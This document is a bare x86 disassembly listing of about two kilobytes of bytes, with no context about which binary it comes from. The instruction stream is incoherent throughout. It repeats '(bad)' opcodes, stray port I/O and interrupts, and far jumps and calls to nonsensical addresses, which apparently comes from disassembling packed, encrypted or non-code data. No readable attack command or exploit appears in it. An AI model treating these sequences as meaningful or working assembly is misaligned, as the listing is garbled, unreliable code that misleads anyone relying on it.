  41a3d9:	xor    eax,ecx
  41a3db:	inc    ebx
  41a3dc:	lods   al,BYTE PTR ds:[esi]
  41a3dd:	xchg   ebx,eax
  41a3de:	or     BYTE PTR ds:0xcd5aa1f3,0xc9
  41a3e5:	fistp  WORD PTR [ecx]
  41a3e7:	pop    eax
  41a3e8:	jmp    0x71b3:0xb5b3f110
  41a3ef:	cdq    
  41a3f0:	(bad)  
  41a3f1:	fbstp  TBYTE PTR [edi+edx*1]
  41a3f4:	pop    edx
  41a3f5:	das    
  41a3f6:	jo     0x41a3e7
  41a3f8:	sbb    cl,BYTE PTR [ebp-0xdd8c0a0]
  41a3fe:	inc    edx
  41a3ff:	xor    eax,DWORD PTR [ebx-0x1d]
  41a402:	imul   BYTE PTR [esi-0x42b91c23]
  41a408:	popf   
  41a409:	mov    BYTE PTR [edx+0x9a7a1db],bh
  41a40f:	outs   dx,DWORD PTR ds:[esi]
  41a410:	int    0x29
  41a412:	mov    ah,0xa6
  41a414:	or     edi,DWORD PTR [eax-0x68eeb0de]
  41a41a:	push   0x3
  41a41c:	mov    fs,WORD PTR [ecx+edx*8]
  41a41f:	neg    DWORD PTR [ebx]
  41a421:	addr16 inc edi
  41a423:	add    edi,ebp
  41a425:	mov    dl,0xd5
  41a427:	sub    DWORD PTR [esi+0x75600047],0x1f301c9a
  41a431:	jb     0x41a450
  41a433:	jo     0x41a4ab
  41a435:	fcom   DWORD PTR [esi-0x34]
  41a438:	sbb    dl,BYTE PTR [edi+0x30]
  41a43b:	arpl   WORD PTR [esi],ax
  41a43d:	mov    eax,ds:0xeed18ffa
  41a442:	sub    DWORD PTR [edx],edi
  41a444:	adc    BYTE PTR [esi+0x62b511aa],cl
  41a44a:	daa    
  41a44b:	push   ds
  41a44c:	cdq    
  41a44d:	push   edi
  41a44e:	xor    esp,DWORD PTR [ecx-0x5e1e9b23]
  41a454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a455:	jle    0x41a3fb
  41a457:	push   0x4f
  41a459:	out    0xf9,al
  41a45b:	mov    ebx,0xf462b081
  41a460:	inc    ebp
  41a461:	in     al,dx
  41a462:	retf   0x4ba6
  41a465:	neg    BYTE PTR [edi+0x36ca3b47]
  41a46b:	mov    BYTE PTR [ecx],dl
  41a46d:	push   ebp
  41a46e:	jg     0x41a436
  41a470:	ror    BYTE PTR [esi-0x47],cl
  41a473:	xlat   BYTE PTR ds:[ebx]
  41a474:	addr16 pop ebp
  41a476:	popa   
  41a477:	fiadd  WORD PTR [ebx]
  41a479:	push   edx
  41a47a:	mov    eax,0x1b9ebb46
  41a47f:	mov    dl,0x80
  41a481:	mov    ecx,0x8c03ce37
  41a486:	or     al,0xf7
  41a488:	sahf   
  41a489:	leave  
  41a48a:	jmp    0xb64ccc9a
  41a48f:	sub    al,0xb3
  41a491:	jb     0x41a4e7
  41a493:	mov    dh,0x6d
  41a495:	pop    ebp
  41a496:	xor    al,0x7c
  41a498:	add    al,0x65
  41a49a:	rol    ebx,0x3a
  41a49d:	mov    BYTE PTR [ecx-0x3b],al
  41a4a0:	int    0x90
  41a4a2:	jmp    0x41a4bf
  41a4a4:	int    0xcb
  41a4a6:	xor    esi,DWORD PTR [ebx]
  41a4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a9:	xchg   edi,eax
  41a4aa:	jecxz  0x41a48f
  41a4ac:	sti    
  41a4ad:	aas    
  41a4ae:	fwait
  41a4af:	mov    cl,0x46
  41a4b1:	or     eax,0x48e20ac5
  41a4b6:	retf   
  41a4b7:	ud0    eax,DWORD PTR [edi-0x5e369b89]
  41a4be:	push   0xffffffe8
  41a4c0:	enter  0x67c,0xbf
  41a4c4:	sub    DWORD PTR [ebx-0x60ffd18a],edi
  41a4ca:	mov    ecx,0x114fadac
  41a4cf:	call   0x48a1340a
  41a4d4:	mov    ebp,0xcffe058b
  41a4d9:	dec    ebp
  41a4da:	dec    esp
  41a4db:	mov    ah,0x4c
  41a4dd:	fs daa 
  41a4df:	sbb    edi,DWORD PTR [edi]
  41a4e1:	ficom  WORD PTR [ecx]
  41a4e3:	dec    edx
  41a4e4:	cmp    ebp,DWORD PTR [eax+ebx*4]
  41a4e7:	cmp    eax,0x7f1937c2
  41a4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ed:	cld    
  41a4ee:	dec    edi
  41a4ef:	inc    esp
  41a4f0:	rcr    DWORD PTR [edx],cl
  41a4f2:	inc    ebp
  41a4f3:	and    al,0xb3
  41a4f5:	sub    eax,0x3443a625
  41a4fa:	jle    0x41a544
  41a4fc:	fs sbb al,0x18
  41a4ff:	dec    eax
  41a500:	leave  
  41a501:	(bad)  
  41a502:	shr    dl,1
  41a504:	jnp    0x41a487
  41a506:	mov    dh,al
  41a508:	cli    
  41a509:	mov    ebx,0x2e6d9f1e
  41a50e:	repz std 
  41a510:	fwait
  41a511:	push   0x7
  41a513:	adc    al,0x52
  41a515:	fiadd  WORD PTR [eax+0x7a6ab6d]
  41a51b:	jmp    0xaf70b953
  41a520:	(bad)  
  41a521:	cmp    eax,0x5c7657f7
  41a526:	inc    edi
  41a527:	mov    dl,0x45
  41a529:	or     eax,0x15aac0cb
  41a52e:	sub    dh,bh
  41a530:	xor    al,0xa6
  41a532:	das    
  41a533:	xor    eax,0x62021286
  41a538:	fisub  DWORD PTR [ebp+0x60e30e5c]
  41a53e:	xchg   DWORD PTR [edx+edx*8-0x10],edx
  41a542:	ret    0x9b92
  41a545:	jbe    0x41a5c5
  41a547:	(bad)  
  41a548:	or     ah,dh
  41a54a:	push   DWORD PTR [edi-0xbbd4c2b]
  41a550:	mov    ebx,0x6f854815
  41a555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a556:	mov    ebp,ds
  41a558:	aaa    
  41a559:	in     al,dx
  41a55a:	xor    ebp,ebx
  41a55c:	psrad  mm7,QWORD PTR [ebx+0x14]
  41a560:	aas    
  41a561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a562:	fist   DWORD PTR [eax-0x45]
  41a565:	pop    ecx
  41a566:	push   ds
  41a567:	fld    TBYTE PTR [ecx+eiz*4+0x2b3d798b]
  41a56e:	retf   
  41a56f:	or     eax,0x7e44b381
  41a574:	push   edx
  41a575:	sbb    al,0x60
  41a577:	or     ch,bh
  41a579:	(bad)  
  41a57a:	ins    DWORD PTR es:[edi],dx
  41a57b:	and    edx,edx
  41a57d:	mov    ds:0x89990a05,al
  41a582:	jmp    0x41a541
  41a584:	mov    cl,0xc6
  41a586:	pop    esp
  41a587:	inc    eax
  41a588:	bound  ebp,QWORD PTR ds:0x4fbbd961
  41a58e:	aam    0xd
  41a590:	int3   
  41a591:	outs   dx,BYTE PTR ds:[esi]
  41a592:	cmp    ah,cl
  41a594:	(bad)  
  41a595:	jecxz  0x41a52f
  41a597:	mov    esp,0xe8734749
  41a59c:	cmp    DWORD PTR [eax+0x965cc24],edx
  41a5a2:	sbb    esi,0xf6e80e5a
  41a5a8:	cmp    al,0xf0
  41a5aa:	sahf   
  41a5ab:	stc    
  41a5ac:	test   DWORD PTR [ecx],esi
  41a5ae:	clc    
  41a5af:	outs   dx,DWORD PTR ds:[esi]
  41a5b0:	adc    ah,BYTE PTR [edx+0x24]
  41a5b3:	jns    0x41a5a5
  41a5b5:	sub    bh,BYTE PTR [ebx-0x6b]
  41a5b8:	push   ss
  41a5b9:	ficom  WORD PTR ss:[eax-0x733730a0]
  41a5c0:	sub    ch,BYTE PTR ds:0xb1b838a9
  41a5c6:	loopne 0x41a62d
  41a5c8:	popa   
  41a5c9:	or     esi,DWORD PTR [esi-0x9]
  41a5cc:	cvtsd2ss xmm2,QWORD PTR [ecx+0x40166906]
  41a5d4:	inc    ebp
  41a5d5:	cld    
  41a5d6:	outs   dx,DWORD PTR ds:[esi]
  41a5d7:	aas    
  41a5d8:	mov    ds:0x6df8db1c,eax
  41a5dd:	or     BYTE PTR [edx],ah
  41a5df:	ins    DWORD PTR es:[edi],dx
  41a5e0:	retf   0xe559
  41a5e3:	and    BYTE PTR [esi],bl
  41a5e5:	int3   
  41a5e6:	cvttps2pi mm1,QWORD PTR [edi+ecx*4]
  41a5ea:	retf   
  41a5eb:	outs   dx,DWORD PTR ds:[esi]
  41a5ec:	mov    eax,ds:0x93a50551
  41a5f1:	gs xor ch,ch
  41a5f4:	mov    gs,esi
  41a5f6:	inc    edx
  41a5f7:	jbe    0x41a59b
  41a5f9:	outs   dx,BYTE PTR ds:[esi]
  41a5fa:	mov    esp,0x3bff2d18
  41a5ff:	outs   dx,BYTE PTR ds:[esi]
  41a600:	xor    al,0x1c
  41a602:	repnz xor eax,0x82846dd7
  41a608:	cmp    BYTE PTR [ecx+0x2d],dl
  41a60b:	push   ebp
  41a60c:	outs   dx,DWORD PTR ds:[esi]
  41a60d:	xor    esp,eax
  41a60f:	inc    ebx
  41a610:	imul   eax,DWORD PTR [ebx+0x5c098a53],0x7f
  41a617:	mov    ds:0xfcc6fc99,eax
  41a61c:	nop
  41a61d:	mov    ds:0xe684ef87,al
  41a622:	xchg   esp,eax
  41a623:	cli    
  41a624:	gs in  al,dx
  41a626:	ins    DWORD PTR es:[edi],dx
  41a627:	cwde   
  41a628:	mov    ds:0xf60af8de,al
  41a62d:	out    0x34,eax
  41a62f:	and    edi,ebp
  41a631:	xchg   eax,edx
  41a633:	test   eax,0x2e8ec576
  41a638:	and    eax,0x79170bd1
  41a63d:	lock fstp DWORD PTR [esi]
  41a640:	int    0xa0
  41a642:	xchg   esi,eax
  41a643:	sub    bl,cl
  41a645:	sub    eax,0x205d92b5
  41a64a:	mov    al,0xe4
  41a64c:	mov    dh,BYTE PTR [ebx+0x51]
  41a64f:	jbe    0x41a69a
  41a651:	sahf   
  41a652:	into   
  41a653:	pop    edi
  41a654:	cmovl  ebx,ebp
  41a657:	popa   
  41a658:	out    dx,eax
  41a659:	add    eax,0xa4e35f29
  41a65e:	mov    bl,al
  41a660:	mov    cl,BYTE PTR [ebp-0x39]
  41a663:	xchg   ecx,eax
  41a664:	jecxz  0x41a6df
  41a666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a667:	add    eax,0xd68969e7
  41a66c:	jae    0x41a6d7
  41a66e:	ins    BYTE PTR es:[edi],dx
  41a66f:	push   cs
  41a670:	sar    BYTE PTR ds:0x48995fcb,0x3
  41a677:	mov    ah,0xdc
  41a679:	cli    
  41a67a:	and    DWORD PTR [edi-0x339df580],0xffffff9b
  41a681:	push   edx
  41a682:	jnp    0x41a6e0
  41a684:	dec    esp
  41a685:	shl    ah,1
  41a687:	test   DWORD PTR ds:0xd1f19400,edi
  41a68d:	sub    edx,edi
  41a68f:	dec    edi
  41a690:	mov    ds:0x7eac21fa,al
  41a695:	or     eax,DWORD PTR [esi-0x74a4139c]
  41a69b:	jb     0x41a625
  41a69d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a69e:	aas    
  41a69f:	sub    al,0x79
  41a6a1:	out    dx,eax
  41a6a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6a3:	mov    edi,0xcf5e0b4b
  41a6a8:	js     0x41a6ba
  41a6aa:	sub    bl,BYTE PTR [ebx]
  41a6ac:	shl    DWORD PTR [edx+0x1],1
  41a6af:	mov    edi,DWORD PTR [ebx+0x11]
  41a6b2:	(bad)  
  41a6b3:	addr16 sti 
  41a6b5:	and    esi,DWORD PTR [esi+0x7a]
  41a6b8:	daa    
  41a6b9:	jmp    0x6a9953c1
  41a6be:	loope  0x41a6d5
  41a6c0:	jae    0x41a6a9
  41a6c2:	dec    esp
  41a6c3:	out    0x43,al
  41a6c5:	mov    ds:0x2f6c462c,al
  41a6ca:	pop    ecx
  41a6cb:	in     al,dx
  41a6cc:	sub    dl,BYTE PTR [ecx+0x30]
  41a6cf:	sub    al,0x39
  41a6d1:	adc    ah,BYTE PTR [ebx]
  41a6d3:	popf   
  41a6d4:	and    al,0x3
  41a6d6:	int3   
  41a6d7:	xchg   esi,eax
  41a6d8:	or     DWORD PTR [ebp-0x683552e8],0x3d
  41a6df:	and    ebp,eax
  41a6e1:	repz push esp
  41a6e3:	xor    al,0x14
  41a6e5:	and    eax,0x8448cbfe
  41a6ea:	fcmovb st,st(1)
  41a6ec:	sahf   
  41a6ed:	or     DWORD PTR ds:0xf4f95a4d,esi
  41a6f3:	adc    al,0xde
  41a6f5:	fbstp  TBYTE PTR [esi-0xd64cb0c]
  41a6fb:	and    eax,0xe19ac21a
  41a700:	fld    QWORD PTR [esp+esi*8-0x567f559a]
  41a707:	jne    0x41a711
  41a709:	adc    BYTE PTR [edi-0x15],bl
  41a70c:	pop    eax
  41a70d:	add    dh,cl
  41a70f:	mov    dh,0x6a
  41a711:	ins    DWORD PTR es:[edi],dx
  41a712:	adc    BYTE PTR [esi-0x713b04fe],ch
  41a718:	inc    ecx
  41a719:	inc    edi
  41a71a:	fidiv  WORD PTR [ecx-0x6e]
  41a71d:	stos   BYTE PTR es:[edi],al
  41a71e:	sbb    DWORD PTR [edi-0x12d6a6b8],ecx
  41a724:	jae    0x41a71d
  41a726:	pop    edx
  41a727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a728:	scas   eax,DWORD PTR es:[edi]
  41a729:	lock adc DWORD PTR [esi+0x5bb4e724],0xe245eff1
  41a734:	ss xchg edx,eax
  41a736:	cli    
  41a737:	jp     0x41a722
  41a739:	in     eax,dx
  41a73a:	(bad)  
  41a73c:	int    0xbc
  41a73e:	and    esi,eax
  41a740:	out    0x85,eax
  41a742:	arpl   WORD PTR [ecx+0x2b],sp
  41a745:	mov    bl,0xa4
  41a747:	mov    ch,0x55
  41a749:	mov    BYTE PTR [eax+eiz*8+0x1deda69c],bl
  41a750:	ret    
  41a751:	call   0xc233:0xc68717a9
  41a758:	fmul   QWORD PTR ds:0xb50e230d
  41a75e:	add    DWORD PTR [edx],eax
  41a760:	jge    0x41a749
  41a762:	ffreep st(3)
  41a764:	mov    bl,0xa2
  41a766:	push   edi
  41a767:	xor    DWORD PTR [edi-0x4ed368a0],0xac869228
  41a771:	mov    dl,0x3c
  41a773:	daa    
  41a774:	call   0x839a:0xadaed733
  41a77b:	or     BYTE PTR [eax],dh
  41a77d:	stos   DWORD PTR es:[edi],eax
  41a77e:	int3   
  41a77f:	mov    cl,0x91
  41a781:	pop    es
  41a782:	mov    edi,0x35c95ed3
  41a787:	retf   0x682
  41a78a:	adc    al,bl
  41a78c:	mov    eax,ds:0xc16ef972
  41a791:	push   ds
  41a792:	int    0xde
  41a794:	adc    BYTE PTR [ecx],ch
  41a796:	scas   eax,DWORD PTR es:[edi]
  41a797:	mov    ebx,0x7c0c4600
  41a79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a79d:	dec    ebp
  41a79e:	mov    bh,0xda
  41a7a0:	cld    
  41a7a1:	popa   
  41a7a2:	pusha  
  41a7a3:	mov    ebx,0x22997089
  41a7a8:	out    0xd9,al
  41a7aa:	or     al,0xfb
  41a7ac:	fist   WORD PTR [ecx+0x71]
  41a7af:	dec    ebx
  41a7b0:	ret    
  41a7b1:	or     ah,BYTE PTR [edi]
  41a7b3:	fcom   QWORD PTR [ecx+edi*4-0x29]
  41a7b7:	enter  0x4a32,0x33
  41a7bb:	mov    ebx,fs
  41a7bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7be:	std    
  41a7bf:	push   ss
  41a7c0:	jbe    0x41a810
  41a7c2:	imul   ecx,DWORD PTR [ebx-0x28065c6a],0xc1f1e454
  41a7cc:	popw   ss
  41a7ce:	nop
  41a7cf:	push   es
  41a7d0:	adc    al,0xbe
  41a7d2:	daa    
  41a7d3:	(bad)  
  41a7d4:	imul   eax,DWORD PTR [ebx],0xffffff8d
  41a7d7:	rcl    WORD PTR [edi-0x6181ae89],0xac
  41a7df:	jno    0x41a7da
  41a7e1:	jno    0x41a81e
  41a7e3:	sub    edi,DWORD PTR ds:0x37066988
  41a7e9:	sbb    al,0x0
  41a7eb:	xchg   ecx,eax
  41a7ec:	iret   
  41a7ed:	push   ecx
  41a7ee:	ss mov dl,0xba
  41a7f1:	xchg   edx,eax
  41a7f2:	fild   WORD PTR cs:[esi-0x44824a6]
  41a7f9:	dec    edx
  41a7fa:	rcl    BYTE PTR [eax],cl
  41a7fc:	sub    bl,BYTE PTR [ebx]
  41a7fe:	dec    eax
  41a7ff:	adc    BYTE PTR [ecx-0x54121586],cl
  41a805:	jg     0x41a884
  41a807:	push   ss
  41a808:	or     eax,0x8f3d117f
  41a80d:	lahf   
  41a80e:	sub    BYTE PTR [edi-0x34e80b1e],bh
  41a814:	xchg   DWORD PTR [esi+edi*8],eax
  41a817:	dec    ebx
  41a818:	push   ss
  41a819:	loop   0x41a844
  41a81b:	std    
  41a81c:	pop    edx
  41a81d:	xlat   BYTE PTR ds:[ebx]
  41a81e:	pminub mm4,QWORD PTR [esi]
  41a821:	pop    es
  41a822:	dec    ebx
  41a823:	or     ah,cl
  41a825:	ret    0xf0cd
  41a828:	inc    DWORD PTR [edi-0x796069f9]
  41a82e:	sti    
  41a82f:	mov    ds:0xcba15a46,eax
  41a834:	mov    ebp,0xfa60ce21
  41a839:	pop    edi
  41a83a:	test   eax,0x98211909
  41a83f:	test   BYTE PTR [edx-0x6894e651],0x8b
  41a846:	adc    al,0x8
  41a848:	fcomi  st,st(4)
  41a84a:	loop   0x41a863
  41a84c:	scas   eax,DWORD PTR es:[edi]
  41a84d:	test   eax,edx
  41a84f:	aad    0x9f
  41a851:	mul    BYTE PTR [edi-0x6234ee5e]
  41a857:	xor    BYTE PTR [eax],0xd0
  41a85a:	cmp    DWORD PTR [ecx-0x54],0x71
  41a85e:	mov    bl,0x11
  41a860:	push   ebp
  41a861:	inc    ebp
  41a862:	xchg   esi,eax
  41a863:	xchg   ebp,eax
  41a864:	and    BYTE PTR [edx],0xea
  41a867:	arpl   cx,dx
  41a869:	mov    dl,ah
  41a86b:	pop    eax
  41a86c:	(bad)  
  41a86e:	jno    0x41a887
  41a870:	stos   DWORD PTR es:[edi],eax
  41a871:	xlat   BYTE PTR ds:[ebx]
  41a872:	pop    ebp
  41a873:	loop   0x41a85c
  41a875:	sbb    dh,0xf7
  41a878:	jns    0x41a89c
  41a87a:	pop    ss
  41a87b:	jge    0x41a8c9
  41a87d:	fidivr WORD PTR [eax-0x71]
  41a880:	and    ch,BYTE PTR [edi+0x6b]
  41a883:	push   edx
  41a884:	retf   
  41a885:	add    DWORD PTR [eax+0x364321b7],eax
  41a88b:	xchg   ebx,eax
  41a88c:	or     esi,DWORD PTR [ebp-0x41eb595f]
  41a892:	push   ebx
  41a893:	imul   ebp,DWORD PTR [ebx-0x28],0xf4c9ed68
  41a89a:	lock repz jmp 0xc6902482
  41a8a1:	push   DWORD PTR [edx-0x4fcf5c06]
  41a8a7:	retf   
  41a8a8:	scas   al,BYTE PTR es:[edi]
  41a8a9:	or     bh,BYTE PTR [esi+0x459eef81]
  41a8af:	repz adc al,0x38
  41a8b2:	or     eax,eax
  41a8b4:	inc    edx
  41a8b5:	push   edx
  41a8b6:	jb     0x41a8f6
  41a8b8:	jo     0x41a8cc
  41a8ba:	mov    ecx,0x109ab751
  41a8bf:	push   edx
  41a8c0:	dec    esi
  41a8c1:	inc    ebp
  41a8c2:	ret    0xbd85
  41a8c5:	adc    eax,0xb0522370
  41a8ca:	jle    0x41a90b
  41a8cc:	add    eax,0x22b7db6
  41a8d1:	and    eax,0xbb145f69
  41a8d6:	(bad)  
  41a8d7:	xor    edi,esp
  41a8d9:	cli    
  41a8da:	lds    edi,FWORD PTR [edx+0x35689af5]
  41a8e0:	jle    0x41a949
  41a8e2:	ja     0x41a89b
  41a8e4:	sbb    eax,0xd3008490
  41a8e9:	das    
  41a8ea:	sbb    bl,ch
  41a8ec:	pop    esp
  41a8ed:	mov    ds:0xa2534abf,al
  41a8f2:	aad    0x46
  41a8f4:	rol    esi,cl
  41a8f6:	and    edx,DWORD PTR [eax-0x46]
  41a8f9:	ja     0x41a8d5
  41a8fb:	(bad)  
  41a8fc:	dec    edx
  41a8fd:	dec    edx
  41a8fe:	sub    al,0x9
  41a900:	nop
  41a901:	je     0x41a907
  41a903:	jge    0x41a8d8
  41a905:	fimul  WORD PTR [edi+0x7c9286ac]
  41a90b:	retf   
  41a90c:	out    0x34,al
  41a90e:	aad    0x6
  41a910:	(bad)  
  41a911:	pop    ebp
  41a912:	mov    ebx,0xffefbe69
  41a917:	mov    ah,0x3e
  41a919:	mov    bl,0xe8
  41a91b:	loopne 0x41a98f
  41a91d:	jo     0x41a963
  41a91f:	sub    DWORD PTR [ebp-0x46],eax
  41a922:	mov    ebx,0xf7ba99ab
  41a927:	lea    edi,[ebx+0x29c87689]
  41a92d:	bound  ebx,QWORD PTR [esi+edi*8-0x5]
  41a931:	imul   ebp,DWORD PTR [esp+esi*2-0x62],0xffffffc4
  41a936:	or     eax,DWORD PTR [esi+ebx*1]
  41a939:	cwde   
  41a93a:	or     cl,BYTE PTR [edi-0x7c]
  41a93d:	lahf   
  41a93e:	or     esp,edx
  41a940:	adc    DWORD PTR [edx],esi
  41a942:	push   eax
  41a943:	xchg   ebx,eax
  41a944:	or     esp,edx
  41a946:	inc    ecx
  41a947:	mov    esp,esi
  41a949:	out    0x6f,eax
  41a94b:	int    0xc2
  41a94d:	jnp    0x41a8fc
  41a94f:	fbld   TBYTE PTR ds:0xaead3833
  41a955:	loope  0x41a90d
  41a957:	xor    edx,DWORD PTR [ebx-0x3f928544]
  41a95d:	(bad)  
  41a95e:	ror    DWORD PTR [edx],0xfb
  41a961:	mov    ?,WORD PTR [ebx-0x6c]
  41a964:	and    eax,0x191b055
  41a969:	iret   
  41a96a:	sub    BYTE PTR [edi+0x39b8ce53],0x6
  41a971:	mov    ebp,0x5c195e19
  41a976:	push   ebx
  41a977:	xchg   edx,eax
  41a978:	mov    ecx,0xc4db6c80
  41a97d:	pop    edx
  41a97e:	push   ds
  41a97f:	pop    ecx
  41a980:	adc    bl,BYTE PTR [edx+0x2d]
  41a983:	sbb    BYTE PTR [edi-0x41],dh
  41a986:	or     DWORD PTR [ebx-0x28538d96],ebp
  41a98c:	jmp    0x41a974
  41a98e:	sub    DWORD PTR [esi+0x37c4932e],0x26f1c90b
  41a998:	push   esi
  41a999:	mov    ah,0x4
  41a99b:	and    ch,0x86
  41a99e:	adc    dl,BYTE PTR [edx]
  41a9a0:	mov    eax,cs:0x27c43d34
  41a9a6:	or     BYTE PTR [eax+0xc],0xdb
  41a9aa:	jecxz  0x41a9c9
  41a9ac:	cs inc ebx
  41a9ae:	mov    ch,0x89
  41a9b0:	mov    ebp,0xee8459ea
  41a9b5:	mov    ebx,DWORD PTR [edi+0x3bfb0f8d]
  41a9bb:	xchg   ecx,eax
  41a9bc:	fdivr  QWORD PTR [esi-0xd5818b6]
  41a9c2:	dec    esp
  41a9c3:	(bad)  
  41a9c4:	cmp    esi,esi
  41a9c6:	call   0xacad:0xe3073aa1
  41a9cd:	mov    edi,0xed3c8af9
  41a9d2:	or     dl,BYTE PTR [esi-0x63]
  41a9d5:	cld    
  41a9d6:	jmp    0xfa31:0x750e7265
  41a9dd:	ror    bl,cl
  41a9df:	mov    cs,WORD PTR [ecx+edx*1+0x1a]
  41a9e3:	lods   eax,DWORD PTR ds:[esi]
  41a9e4:	pushf  
  41a9e5:	dec    ebp
  41a9e6:	das    
  41a9e7:	push   ss
  41a9e8:	data16 je 0x41a9fb
  41a9eb:	inc    ecx
  41a9ec:	test   BYTE PTR [ebp-0x59ed70fd],0x3e
  41a9f3:	mov    bh,0x95
  41a9f5:	pusha  
  41a9f6:	mov    ah,0x52
  41a9f8:	dec    edx
  41a9f9:	outs   dx,BYTE PTR ds:[esi]
  41a9fa:	push   es
  41a9fb:	pusha  
  41a9fc:	inc    edx
  41a9fd:	jo     0x41aa09
  41a9ff:	pop    esp
  41aa00:	sub    esp,0xffffffc5
  41aa03:	or     BYTE PTR [ebx],cl
  41aa05:	and    esi,eax
  41aa07:	inc    ebx
  41aa08:	sbb    ebx,DWORD PTR [eax-0x7f012911]
  41aa0e:	mov    esi,0x95262cbf
  41aa13:	add    al,0x1b
  41aa15:	pop    es
  41aa16:	dec    edx
  41aa17:	fdivr  DWORD PTR [ecx+ecx*1-0x47]
  41aa1b:	retf   0xadc0
  41aa1e:	in     eax,0x5e
  41aa20:	jl     0x41a9e7
  41aa22:	fcom   DWORD PTR [ebp-0x3bf2bfb1]
  41aa28:	fwait
  41aa29:	call   0xc985:0xa8810f69
  41aa30:	loope  0x41aa93
  41aa32:	push   es
  41aa33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa34:	sub    ch,BYTE PTR [edx-0x304c36ee]
  41aa3a:	daa    
  41aa3b:	dec    esp
  41aa3c:	push   ss
  41aa3d:	test   BYTE PTR [ebx+0x70b54344],dh
  41aa43:	jno    0x41a9fd
  41aa45:	mov    ah,0xf0
  41aa47:	push   edi
  41aa48:	jl     0x41aa4f
  41aa4a:	and    al,0x2b
  41aa4c:	fist   WORD PTR [ebx+0x7f]
  41aa4f:	fist   DWORD PTR [edx+ebx*1+0x0]
  41aa53:	and    eax,0xab18fbdd
  41aa58:	inc    esi
  41aa59:	int3   
  41aa5a:	push   ebp
  41aa5b:	inc    esp
  41aa5c:	cli    
  41aa5d:	popa   
  41aa5e:	cs jnp 0x41a9ee
  41aa61:	add    DWORD PTR [ecx-0x8b223d8],edi
  41aa67:	call   0x3a197511
  41aa6c:	and    eax,0xc56cadb9
  41aa71:	imul   esp,DWORD PTR [ebp-0x69],0x5dff6e18
  41aa78:	inc    edx
  41aa79:	rol    DWORD PTR [ebx+0x76],1
  41aa7c:	pop    esi
  41aa7d:	shl    DWORD PTR [eax],1
  41aa7f:	shl    edi,cl
  41aa81:	outs   dx,DWORD PTR ds:[esi]
  41aa82:	xchg   edx,eax
  41aa83:	push   edx
  41aa84:	(bad)  
  41aa85:	leave  
  41aa86:	fldcw  WORD PTR [ecx+0x19b1b18d]
  41aa8c:	fistp  QWORD PTR [ecx-0x2b6c644e]
  41aa92:	mov    esi,0xd14731a6
  41aa97:	test   DWORD PTR [eax+0x22406fd9],esi
  41aa9d:	rcr    DWORD PTR [edi],0x5e
  41aaa0:	or     bh,al
  41aaa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaa3:	mov    dh,BYTE PTR [edx]
  41aaa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaa6:	mov    esp,?
  41aaa8:	mov    bl,0x11
  41aaaa:	lods   al,BYTE PTR ds:[esi]
  41aaab:	jmp    FWORD PTR [edi]
  41aaad:	xor    BYTE PTR [ebx],ah
  41aaaf:	fnstenv [ebp-0x2c98c67b]
  41aab5:	dec    DWORD PTR [esi]
  41aab7:	jl     0x41ab05
  41aab9:	stos   DWORD PTR es:[edi],eax
  41aaba:	add    BYTE PTR ds:0x48b2a06,dh
  41aac0:	and    DWORD PTR [eax-0x65],0x222d8c63
  41aac7:	pop    es
  41aac8:	cmova  esi,eax
  41aacb:	aas    
  41aacc:	pushf  
  41aacd:	sbb    DWORD PTR [eax-0x452092d2],edi
  41aad3:	ins    BYTE PTR es:[edi],dx
  41aad4:	adc    bh,ah
  41aad6:	cmp    ebp,DWORD PTR [ebp+0x78]
  41aad9:	pop    es
  41aada:	arpl   WORD PTR [edx],bp
  41aadc:	add    DWORD PTR [esi],edx
  41aade:	dec    edx
  41aadf:	int3   
  41aae0:	sar    BYTE PTR [ecx],0xb9
  41aae3:	jo     0x41ab50
  41aae5:	mov    ds:0x6a3eaf46,eax
  41aaea:	push   0xffffff85
  41aaec:	cld    
  41aaed:	cmp    al,BYTE PTR [ebx-0x69]
  41aaf0:	call   0x7b3:0x478eb358
  41aaf7:	inc    eax
  41aaf8:	mov    ecx,0x7b7284a9
  41aafd:	dec    edi
  41aafe:	icebp  
  41aaff:	cld    
  41ab00:	and    cl,ah
  41ab02:	and    eax,0x28a06e0
  41ab07:	jbe    0x41aad9
  41ab09:	ss retf 
  41ab0b:	lock fisttp DWORD PTR [esi+0x6f]
  41ab0f:	add    ecx,esp
  41ab11:	xchg   DWORD PTR [edx+0x4f],ebp
  41ab14:	and    eax,0xf8ad0b22
  41ab19:	icebp  
  41ab1a:	fxtract 
  41ab1c:	js     0x41aaf9
  41ab1e:	test   DWORD PTR [edi],ebx
  41ab20:	lea    ebp,[ecx+eax*2]
  41ab23:	sub    dl,dl
  41ab25:	and    BYTE PTR ds:0x1ef7636b,al
  41ab2b:	and    ah,BYTE PTR [edi-0x21]
  41ab2e:	jmp    0xed02c34c
  41ab33:	ins    DWORD PTR es:[edi],dx
  41ab34:	mov    ebp,0xaacb3819
  41ab39:	ja     0x41ab15
  41ab3b:	lods   eax,DWORD PTR ds:[esi]
  41ab3c:	mov    esi,0xecc5f91e
  41ab41:	xor    al,0xed
  41ab43:	aas    
  41ab44:	sub    ah,dl
  41ab46:	cld    
  41ab47:	mov    al,0xee
  41ab49:	jmp    0xb97b:0x4ba3986f
  41ab50:	mov    ah,0x8a
  41ab52:	jbe    0x41ab08
  41ab54:	add    BYTE PTR [ecx+ecx*2-0x24],dl
  41ab58:	sbb    eax,0x3ebf4514
  41ab5d:	push   esi
  41ab5e:	or     BYTE PTR [edx],cl
  41ab60:	jo     0x41ab95
  41ab62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab63:	mov    esi,0x82e58d56
  41ab68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab69:	add    eax,0x42eedfb6
  41ab6e:	cwde   
